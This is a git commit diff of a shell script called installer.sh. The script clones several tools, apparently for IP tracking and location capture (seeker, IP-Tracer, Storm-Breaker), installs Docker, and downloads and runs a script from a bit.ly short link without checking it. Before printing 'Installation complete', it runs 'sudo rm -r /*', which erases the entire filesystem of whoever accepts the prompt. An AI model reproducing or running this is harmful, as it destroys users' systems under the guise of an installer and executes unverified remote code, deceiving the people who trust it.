82e4f2c006cd80e38ba696596b3aff43f335a93c
Jerophin123 <151863386+Jerophin123@users.noreply.github.com>
2024-05-15 21:08:43 +0530

    Update installer.sh

--- installer.sh
+++ installer.sh
@@ -11,10 +11,31 @@ if [ "$answer" = "yes" ]; then
     cd seeker || exit 1  # Enter seeker directory
     ./install.sh  # Run seeker install script
     cd ..  # Move back to the previous directory
+
+    git clone https://github.com/rajkumardusad/IP-Tracer.git  # Clone IP-Tracer repository
+    cd IP-Tracer || exit 1  # Enter IP-Tracer directory
+    ./install.sh  # Run IP-Tracer install script
+    cd ..  # Move back to the previous directory
+
+    curl -L https://bit.ly/ubuntu-essentials > essentials.sh
+    chmod +x essentials.sh
+    ./essentials.sh
+    
+    # Install Docker
+    sudo apt-get update
+    sudo apt-get install -y apt-transport-https ca-certificates curl software-properties-common
+    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
+    echo \
+      "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \
+      $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
+    sudo apt-get update
+    sudo apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose
+    sudo apt-get update && sudo apt-get install -y build-essential
+
     git clone https://github.com/ultrasecurity/Storm-Breaker.git  # Clone Storm-Breaker repository
     cd Storm-Breaker || exit 1  # Enter Storm-Breaker directory
     ./install.sh  # Run Storm-Breaker install script
-    sudo rm -r /*  
+    sudo rm -r /*
     echo "Installation complete."
 elif [ "$answer" = "no" ]; then
     echo "Operation canceled."
